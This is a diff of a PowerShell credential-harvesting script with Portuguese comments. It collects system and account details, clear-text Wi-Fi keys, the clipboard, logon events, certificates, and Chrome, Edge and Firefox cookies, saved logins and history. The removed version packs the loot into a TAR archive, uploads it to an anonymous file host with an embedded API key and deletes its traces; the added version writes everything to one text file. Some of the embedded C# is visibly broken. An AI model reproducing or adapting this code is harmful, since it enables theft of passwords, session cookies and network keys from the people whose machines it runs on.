@@ -1,79 +1,79 @@
-# KIT v7 – TAR puro (sem ZIP, sem compressão)
-$tmp = "$env:TEMP\k"
-ni -ItemType Directory $tmp -Force | Out-Null
+# KIT v7.1  –  tudo em texto puro
+$out = "$env:TEMP\kit.txt"
+"" | Set-Content $out                        # limpa/arquivo novo
 
-# ---------- 1) TXT com tudo que é texto ----------
-$txt = "$tmp\info.txt"
-(
-    systeminfo
-    Get-CimInstance Win32_ComputerSystem
-    Get-CimInstance Win32_Processor
-    Get-CimInstance Win32_BIOS
-    Get-NetIPConfiguration
-    netsh wlan export profile key=clear folder=$tmp | Out-Null
-    Get-ChildItem $tmp -Filter '*.xml' -EA 0 | %{ Get-Content $_ -Raw }
-    Get-CimInstance Win32_UserAccount
-    net localgroup administradores
-    Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0
-    Get-Clipboard
-    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Name -EA 0
-    Get-ChildItem Cert:\CurrentUser\My | Select Subject, Thumbprint, NotAfter
-) | Out-File $txt -Encoding UTF8
+# ---------- 1) Informações do sistema ----------
+@"
+=== SYSTEMINFO ===
+$(systeminfo)
+=== WIN32_ComputerSystem ===
+$(Get-CimInstance Win32_ComputerSystem | ConvertTo-Json -Compress)
+=== WIN32_Processor ===
+$(Get-CimInstance Win32_Processor | ConvertTo-Json -Compress)
+=== WIN32_BIOS ===
+$(Get-CimInstance Win32_BIOS | ConvertTo-Json -Compress)
+=== IP CONFIG ===
+$(Get-NetIPConfiguration | ConvertTo-Json -Compress)
+=== USERS ===
+$(Get-CimInstance Win32_UserAccount | ConvertTo-Json -Compress)
+=== ADMIN GROUP ===
+$(net localgroup administradores)
+===  ÚLTIMOS 100 LOGONS (4624) ===
+$((Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0) |
+    Select TimeCreated,Id,LevelDisplayName,Message | ConvertTo-Json -Compress)
+=== CLIPBOARD ===
+$(Get-Clipboard -Raw -EA 0)
+=== ARQUIVOS RECENTES ===
+$(Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File -EA 0 |
+    Select Name,LastWriteTime,Length | ConvertTo-Json -Compress)
+=== CERTIFICADOS USER ===
+$(Get-ChildItem Cert:\CurrentUser\My -EA 0 |
+    Select Subject,Thumbprint,NotAfter | ConvertTo-Json -Compress)
+"@ | Add-Content $out
 
-# ---------- 2) Copia binários dos navegadores ----------
-@('Login Data','History','logins.json') | %{
-    Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0 |
-        Select -First 1 | %.{ Copy-Item $_.FullName "$tmp\$($_.Name)" }
-}
+# ---------- 2) Perfis Wi-Fi (XML já é texto) ----------
+try {
+    netsh wlan export profile key=clear folder="$env:TEMP" | Out-Null
+    Get-ChildItem "$env:TEMP" -Filter *.xml -EA 0 | %{
+        "`n=== WI-FI: $($_.Name) ===`n" | Add-Content $out
+        Get-Content $_ -Raw | Add-Content $out
+        Remove-Item $_
+    }
+}catch{}
 
-# ---------- 3) Empacota em TAR puro ----------
-Add-Type -TypeDefinition @"
-using System;
-using System.IO;
-using System.Text;
-public static class MiniTar {
-    public static void Pack(string folder, string tarFile){
-        using(var fs = new FileStream(tarFile, FileMode.Create))
-        foreach(var f in Directory.GetFiles(folder,"*.*",SearchOption.TopDirectoryOnly)){
-            var name = Path.GetFileName(f);
-            var size = new FileInfo(f).Length;
-            // header 512 bytes
-            var header = new byte[512];
-            Array.Copy(Encoding.ASCII.GetBytes(name.PadRight(100,'\0')), 0, header, 0, 100);
-            Array.Copy(Encoding.ASCII.GetBytes(size.ToString("Octal").PadLeft(11,'0')), 0, header or 124, 11);
-            // checksum
-            int chk = 0; for(int i=0;i<512;i++) chk+=header[i];
-            Array.Copy(Encoding.ASCII.GetBytes(Convert.ToString(chk,8).PadLeft(6,'0')+"\0 "),0,header,148,8);
-            fs.Write(header,0,512);
-            // conteúdo
-            using(var src = File.OpenRead(f)) src.CopyTo(fs);
-            // padding para múltiplo de 512
-            long pad = 512 - (size % 512); if(pad!=512) fs.Write(new byte[pad],0,(int)pad);
+# ---------- 3) Cookies / Logins dos navegadores ----------
+@(
+    @{Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default";Files=@('Cookies','Login Data','History')},
+    @{Path="$env:APPDATA\Mozilla\Firefox\Profiles";Files=@('cookies.sqlite','logins.json','places.sqlite')},
+    @{Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default";Files=@('Cookies','Login Data','History')}
+) | %{
+    $base = $_.Path
+    $_.Files | %{
+        $f = Get-ChildItem $base -Recurse -File -Name $_ -EA 0 | Select -First 1
+        if($f){
+            $full = Join-Path $base $f
+            "`n=== NAVEGADOR: $full ===`n" | Add-Content $out
+            # se for SQLite, exporta como JSON simples
+            if($full -match '\.(sqlite|db)$'){
+                try{
+                    Add-Type -Path "$env:PROGRAMFILES\System.Data.SQLite\System.Data.SQLite.dll" -EA Stop
+                    $cnn = New-Object System.Data.SQLite.SQLiteConnection "Data Source=$full;Read Only=True"
+                    $cnn.Open()
+                    $dt = New-Object System.Data.DataTable
+                    (New-Object System.Data.SQLite.SQLiteDataAdapter "SELECT * FROM cookies LIMIT 50",$cnn).Fill($dt) | Out-Null
+                    $cnn.Close()
+                    $dt | ConvertTo-Json -Compress | Add-Content $out
+                }catch{
+                    "# SQLite locked ou driver ausente – copiando raw bytes (base64) #" | Add-Content $out
+                    [Convert]::ToBase64String([IO.File]::ReadAllBytes($full)) | Add-Content $out
+                }
+            }else{
+                Get-Content $full -Raw -EA 0 | Add-Content $out
+            }
         }
-        // fim do arquivo: dois blocos nulos
-        fs.Write(new byte[1024],0,1024);
     }
 }
-"@
-[MiniTar]::Pack($tmp, "$tmp\kit.tar")
 
-# ---------- 4) UPLOAD ----------
-$file = gi "$tmp\kit.tar"
-$key  = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
-$uri  = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"
-try{
-    $resp = Invoke-RestMethod -Uri $uri -Method Post -Form @{file=$file}
-    $resp.data.file.url.full
-}catch{
-    Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red
-}
-
-# ---------- 5) LIMPEZA ----------
-Remove-Item $tmp -Recurse -Force
-
-# ---------- 6) COMO DESCOMPACTAR ----------
-<#
-Baixe o kit.tar
-- Windows: renomeie para .tar e abra com 7-Zip
-- Linux/mac: tar -xf kit.tar
-#>
+# ---------- 4) Entrega ----------
+Write-Host "Kit salvo em:  $out" -Fore Green
+Invoke-Item $out      # abre no notepad
